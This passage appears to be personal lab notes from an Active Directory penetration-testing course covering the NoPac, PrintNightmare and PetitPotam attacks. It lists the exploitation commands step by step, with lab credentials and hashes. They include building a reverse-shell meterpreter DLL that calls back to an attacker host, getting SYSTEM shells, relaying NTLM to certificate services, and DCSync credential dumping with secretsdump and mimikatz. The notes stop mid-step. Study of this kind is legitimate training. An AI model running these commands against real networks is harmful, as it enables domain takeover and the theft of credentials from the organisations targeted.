- https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/
- https://stealthbits.com/blog/what-is-a-dcshadow-attack-and-how-to-defend-against-it/
- The above are not considered "safe" as they might break the prod system
- Example: `PrintNightmare` attack could potentially crash the print spooler service on a remote host and cause a service disruption.
## NoPac (SamAccountName Spoofing)
- https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699
- `noPac` or `SamAccountName Spoofing`
- [2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) and [2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287),
- `42278` is a bypass vulnerability with the Security Account Manager (SAM).
- `42287` is a vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS.
- **EXPLAINED** - https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware
- **TOOLS** 
	- https://github.com/Ridter/noPac
	- `git clone https://github.com/SecureAuthCorp/impacket.git`
	- `python setup.py install`
	- `git clone https://github.com/Ridter/noPac.git`
### Workflow:
- `sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap`
	- scan for the vulnerability using `scanner.py`
	- requires a domain account
	- `ms-DS-MachineAccountQuota` if current quota = 0, this attack fails
- `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap`
	- get a SYSTEM shell using `smbexec.py`
	- NOISY and can be blocked by AD/AV
	- Will save the TGT on your local machine (**.ccache** file)
	- `-dump` flag for DCSync
- We can use this ccache file to pass-the-ticket or DCSync
- `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator`
	- DCSync on user
- ![](/attachments/Pasted-image-20250228181806.png)

<hr>

## PrintNightmare
- found in the [Print Spooler service](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc) that runs on all Windows operating systems
- two vulnerabilities ([CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) and [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675))
### Clone Exploit
- `git clone https://github.com/cube0x0/CVE-2021-1675.git`
### Install cube0x0 impacket
- `pip3 uninstall impacket`
- `git clone https://github.com/cube0x0/impacket`
- `cd impacket`
- `python3 ./setup.py install`
### Enum MS-RPRN
- `rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'`
	- Check if `Print System Asynchronous Protocol` and `Print System Remote Protocol` are exposed on the target.
	- `Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol`
	- `Protocol: [MS-RPRN]: Print System Remote Protocol`
### Generate DLL payload
- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll`
### Share via smbserver.py
- `sudo smbserver.py -smb2support CompData /path/to/backupscript.dll`
### Start a multi handler
- `use exploit/multi/handler`
- `set PAYLOAD windows/x64/meterpreter/reverse_tcp`
- `set LHOST=`
- `set LPORT=`
- `run`
### Run the exploit
- `sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'`
	-  If all goes well after running the exploit, the target will access the share and execute the payload. The payload will then call back to our multi handler giving us an elevated SYSTEM shell.

<hr>

## PetitPotam (MS-EFSRPC)
- [CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942) is an LSA spoofing vulnerability
- patched in aug 2021
- https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/
-  ![](/attachments/Pasted-image-20250228211227.png)

### Start ntlmrelayx.pt - PWNBOX
- **In one window** ->
- `sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController`
	- specify the Web Enrollment URL for CA host
	- use either KerberosAuth or DC AD CS Template
	- We can use https://github.com/zer1t0/certi to locate the location of CA.
<br>
- **In another window** -> run `https://github.com/topotam/PetitPotam`
- `python3 PetitPotam.py 172.16.5.225 172.16.5.5`
	- Attackhost IP first
	- DC IP second
	- There is an executable version of this tool that can be run from a Windows host. The authentication trigger has also been added to Mimikatz and can be run as follows using the encrypting file system (EFS) module: `misc::efs /server:<Domain Controller> /connect:<ATTACK HOST>`. There is also a PowerShell implementation of the tool [Invoke-PetitPotam.ps1](https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1).
### Catching Base64 encoded Certificate
- `sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController`
	- Will provide a Base64 certificate `MIISt<SNIP>`
	- https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf
### Requesting a TGT Using gettgtpkinit.py
- `python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache`
### Setting the KRB5CCNAME Env variable
- `export KRB5CCNAME=dc01.ccache`
	- From the above file, the TGT was saved down to `dc01.ccache`
	- After setting it to the env variable, we can now use for KRBAuth
### OPTION 1: 
#### Using DC TGT to DCSync
- `secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`
	- Retrieve NTLM hashes
- OR 
- `secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`
	- The ccache file will tell the username
#### Confirming access
- `crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf`
### OPTION 2:
#### Submitting a TGS request for ourselves
- Using `getnthash.py`
- `python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$`
#### Use above hash for DCSync with `-hashes`
- `secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba`

**NOTE:**
- Alternatively, once we obtain the base64 certificate via ntlmrelayx.py, we could use the certificate with the Rubeus tool on a Windows attack host to request a TGT ticket and perform a pass-the-ticket (PTT) attack all at once.

### Requesting TGT and Performing PTT with DC01$ Machine Account
- `.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt` - Windows
- `klist` - confirm ticket in memory
- since Domain Controllers have replication privileges in the domain, we can use the pass-the-ticket to perform a DCSync attack using Mimikatz
### Performing DCSync with mimikatz
- `cd .\mimikatz\x64\`
- `.\mimikatz.exe`
- 
